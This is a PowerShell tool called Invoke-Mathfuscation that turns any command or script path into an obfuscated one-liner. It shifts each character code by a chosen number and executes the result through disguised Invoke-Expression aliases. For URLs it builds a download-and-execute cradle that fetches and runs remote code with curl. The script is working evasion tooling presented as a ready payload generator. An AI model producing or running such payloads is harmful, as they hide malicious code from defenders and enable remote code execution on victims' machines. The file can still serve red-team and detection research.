<# 
.SYNOPSIS
    Obfuscate code using math, then execute it. Supports local or remote .ps1 files, or one-liners.
.DESCRIPTION 
     A quick tool that generates uses simple addition to obfuscate individual characters, then executes it using a few random obfuscted invoke expressions.
.NOTES 
    Use at your own risk.
.LINK 
    https://raw.githubusercontent.com/bobby-tablez/Invoke-Mathfuscation/main/Invoke-Mathfuscation.ps1
#>

$plain = "Invoke-Mathfuscation" 
$mfctd = "@(115,152,160,153,149,143,87,119,139,158,146,144,159,157,141,139,158,147,153,152)|%{$isXSw=$isXSw+[char]($_-42)};.(gcm ?e[?x])($isXSw)"

foreach ($char in $plain.ToCharArray()) {
    Write-Host -NoNewline $char -ForegroundColor green
    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 120)
}
Write-Host ""
Write-Host  -NoNewline " + 42 = " -ForegroundColor red

foreach ($char in $mfctd.ToCharArray()) {
    Write-Host -NoNewline $char -ForegroundColor yellow
    Start-Sleep -Milliseconds (Get-Random -Minimum 1 -Maximum 15)
}
Write-Host "`n"

$ErrorActionPreference = [System.Management.Automation.ActionPreference]::Stop

Do{

    $tochar = Read-Host -Prompt "Provide a command, full path to a .ps1 file (local or remote)"

    $raw = $tochar.ToCharArray()
    $space = $tochar.ToCharArray() | %{([int][char]$_) }

    $com = $space -join ","
    $charCom = $space | ForEach-Object {"[char]$_"}
    $char = $charCom -join ","


    Try{ 
        [uint32]$shift = Read-Host -Prompt "`n`nWhat number shoud be added (int)?" -ErrorAction stop
    } 
    Catch [System.Net.WebException],[System.IO.IOException] { 
        throw "Was this a number?" 
        break
    }

    $added = $space | ForEach-Object {($_+$shift)}
    $charShift = $added | ForEach-Object {"[char]$_"}
    $modChar = $added -join ","

    Write-Host "`nHere's your obfuscated payload!`n" 

    $invokes = @('(ga`l ?[?e]x)','(gal ?[?e]x)','(gcm ?[?e]x)','(gcm ?[?e]x)','(gal ?e[?x])','(gcm ?e[?x])','(`ga`l i?[?x])','(g`cm i?[?x])')

    function CalcPayload() {
        $randVar = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        if($tochar -clike 'http*') {
            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '(curl -useb $' + $randVar + ')') -ForegroundColor Yellow
        } else {
            Write-Host ('@(' + $modChar + ')|%{$' + $randVar + '=$' + $randVar + '+[char]($_-' + $shift + ')};.'+ (Get-Random -InputObject $invokes) + '($' + $randVar + ')') -ForegroundColor Yellow
        }
    }

    CalcPayload

    Do{
        $restart = Read-host "Do you want to mathfuscate another? (Y/N)"
        If(($restart -eq "Y") -or ($restart -eq "N")){
            $ver = $true}
        Else{
            write-host -fg Red "Invalid input. (Y/N)?"
        }
    }Until($ver)

}Until($restart -eq "N")

Write-Host "Bye!"
